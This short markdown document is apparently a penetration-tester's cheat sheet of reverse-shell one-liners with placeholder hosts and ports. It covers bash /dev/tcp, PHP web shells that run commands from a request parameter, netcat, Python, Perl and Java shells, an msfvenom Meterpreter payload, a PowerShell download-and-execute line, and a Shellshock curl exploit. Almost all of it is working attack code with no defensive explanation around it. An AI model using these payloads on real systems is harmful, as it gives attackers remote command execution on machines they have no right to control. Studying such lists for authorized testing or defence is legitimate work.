# Reverse shells

## Bash

```bash
/bin/bash -i > /dev/tcp/<host>/<port> 0<&1 2>&1
```

## PHP

```php
<?php echo system($_REQUEST['wakeward']); ?>
```

```php
<?php echo shell_exec($_REQUEST['wakeward']); ?>
```

```bash
php -r '$sock=fsockopen("<host>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Meterpreter PHP reverse shell

    msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e php/base64 -f raw > ~/meter.php

## Netcat

Attacker:

```bash
nc -nlvp <port>
```

Victim:

```bash
nc -e /bin/sh <host> <port>
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <host> <port> >/tmp/f
```

> If option -e is not available

## Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<host>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Perl

```perl
perl -e 'use Socket;$i=<host>;$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Powershell

```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://<host>.ps1')"
```

## Shellshock

```bash
curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/<attacker-ip>/<attacker-port> 0>&1; echo zzzz;'" \
  http://<victim>/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
```

## JAVA

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```